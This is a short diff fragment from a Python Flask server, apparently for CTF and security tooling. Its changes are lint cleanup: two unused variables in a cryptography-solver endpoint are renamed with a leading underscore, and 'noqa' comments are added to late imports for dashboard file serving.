                 tool_commands[tool] = f"{tool} TARGET"
 
         logger.info(f"🔧 CTF tools suggested | Category: {category} | Tools: {len(suggested_tools)}")
@@ -16364,8 +16371,8 @@ def ctf_cryptography_solver():
         params = request.json
         cipher_text = params.get("cipher_text", "")
         cipher_type = params.get("cipher_type", "unknown")
-        key_hint = params.get("key_hint", "")
-        known_plaintext = params.get("known_plaintext", "")
+        _key_hint = params.get("key_hint", "")
+        _known_plaintext = params.get("known_plaintext", "")
         additional_info = params.get("additional_info", "")
 
         if not cipher_text:
@@ -17341,8 +17348,8 @@ def get_alternative_tools():
 BANNER = ModernVisualEngine.create_banner()
 
 # ── Dashboard static file serving ────────────────────────────────────────────
-import pathlib as _pathlib
-from flask import send_from_directory as _sfd, redirect as _redir, session as _sess
+import pathlib as _pathlib  # noqa: E402
+from flask import send_from_directory as _sfd, redirect as _redir, session as _sess  # noqa: E402
 
 @app.route("/", defaults={"filename": "index.html"})
 @app.route("/dashboard/", defaults={"filename": "index.html"})
